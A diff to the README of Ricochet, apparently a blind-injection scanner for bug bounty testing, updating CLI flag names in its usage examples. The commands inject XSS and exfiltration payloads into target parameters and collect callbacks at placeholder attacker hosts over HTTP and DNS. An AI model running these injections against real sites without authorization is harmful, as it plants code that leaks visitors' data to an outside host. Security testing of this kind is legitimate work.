@@ -32,7 +32,7 @@ python3 -m ricochet listen --http --port 8888
 # Terminal 2: Inject payloads
 python3 -m ricochet inject -u "http://target.com/feedback" \
     -p "message" \
-    --callback "http://YOUR_IP:8888"
+    --callback-url "http://YOUR_IP:8888"
 
 # Check for hits (callbacks that fired)
 python3 -m ricochet findings
@@ -49,7 +49,7 @@ python3 -m ricochet report --correlation-id <ID>
 ricochet listen --http --port 8888
 
 # DNS callback server (catches firewall-bypassing exfil)
-ricochet listen --dns --port 5353 --domain cb.yourdomain.com
+ricochet listen --dns --dns-port 5353
 
 # Use Interactsh for external callbacks
 ricochet interactsh --server your-interactsh-server.com
@@ -58,14 +58,14 @@ ricochet interactsh --server your-interactsh-server.com
 ### Injection Modes
 ```bash
 # Target specific parameter
-ricochet inject -u "http://target.com/search" -p "q" --callback "http://cb:8888"
+ricochet inject -u "http://target.com/search" -p "q" --callback-url "http://cb:8888"
 
 # Parse Burp request file
-ricochet inject -r request.txt --callback "http://cb:8888"
+ricochet inject -r request.txt --callback-url "http://cb:8888"
 
 # Auto-discover injection points
 ricochet crawl -u "http://target.com" --depth 3
-ricochet inject --from-crawl --callback "http://cb:8888"
+ricochet inject --from-crawl vectors.json --callback-url "http://cb:8888"
 
 # Custom payloads
 ricochet inject -u "http://target.com/api" -p "data" --payloads wordlist.txt
@@ -90,13 +90,13 @@ ricochet inject -u "http://target.com/api" -p "data" --payloads wordlist.txt
 ```bash
 # Passive mode: inject and poll for callbacks
 ricochet passive -u "http://target.com/submit" -p "comment" \
-    --callback "http://cb:8888" --poll-interval 30
+    --callback-url "http://cb:8888" --poll-interval 30
 
 # Active mode: probe admin endpoints to trigger execution
-ricochet active --callback "http://cb:8888" --target "http://target.com"
+ricochet active -u "http://target.com"
 
 # Get suggestions for where payloads might fire
-ricochet suggest --parameter "username"
+ricochet suggest --param "username"
 ```
 
 ### Output & Reporting
@@ -158,7 +158,7 @@ When XSS fires, Ricochet captures context:
 
 Use exfiltration payloads for rich metadata:
 ```bash
-ricochet inject -u "http://target.com" -p "comment" --type xss --exfil
+ricochet inject -u "http://target.com" -p "comment" --payloads xss-exfil.txt
 ```
 
 ## Bug Bounty Reports
